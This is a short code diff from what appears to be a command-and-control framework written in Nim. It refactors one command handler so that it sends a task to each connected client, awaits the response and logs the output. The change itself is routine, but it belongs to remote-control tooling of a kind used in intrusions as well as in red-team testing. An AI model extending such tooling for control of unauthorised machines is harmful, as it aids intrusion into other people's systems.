@@ -1,17 +1,11 @@
-import std/[
-  asyncdispatch, 
-  strutils, 
-  tables, 
-  jsonutils
-]
-
-import ../../types, ../../communication
+import ../prelude
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for client in server.cli.handlingClient:
     let task = await client.sendClientTask(args[0], toJson args[1..(args.len-1)])
     if not task.isNil(): 
-      server.cli.waitingForOutput = true
+      await task.awaitResponse()
+      logTaskOutput(task)
 
 let cmd*: Command = Command(
   execProc: execProc,
